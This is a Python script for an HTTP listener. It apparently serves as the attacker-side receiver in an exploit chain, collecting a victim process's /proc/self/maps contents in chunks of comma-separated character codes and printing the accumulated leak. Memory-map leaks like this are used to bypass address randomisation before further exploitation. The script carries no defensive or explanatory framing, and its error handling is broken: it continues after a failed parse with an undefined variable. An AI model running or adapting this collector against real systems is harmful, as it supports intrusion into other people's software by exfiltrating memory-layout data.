import http.server
import socketserver

PORT = 8080

current_leak = ''

class LoggingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        user_agent = self.headers.get('User-Agent', 'Unknown')
        print(f"[+] User-Agent: {user_agent}")
        super().do_GET()

    def do_HEAD(self):
        user_agent = self.headers.get('User-Agent', 'Unknown')
        print(f"[+] User-Agent (HEAD): {user_agent}")
        super().do_HEAD()

    def do_POST(self):
        global current_leak
        user_agent = self.headers.get('User-Agent', 'Unknown')
        print(f"[+] User-Agent (POST): {user_agent}")
        print(f"[+] POST URL Path: {self.path}")

        try:
            n = int(self.path[1:])
        except:
            self.send_response(404)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"POST received\n")

        if n != len(current_leak):
            print('restarting leak')
            current_leak = ''

        # Get content length
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b''
        body = post_data.decode('utf-8', errors='replace')
        body_text = ''.join(chr(int(n)) for n in body.split(','))
        current_leak += body_text

        print('currently leaked /proc/self/maps:')
        print(current_leak)

        # Respond with 200 OK
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"POST received\n")

if __name__ == "__main__":
    with socketserver.TCPServer(("", PORT), LoggingHTTPRequestHandler) as httpd:
        print(f"[+] Serving HTTP on port {PORT}")
        httpd.serve_forever()
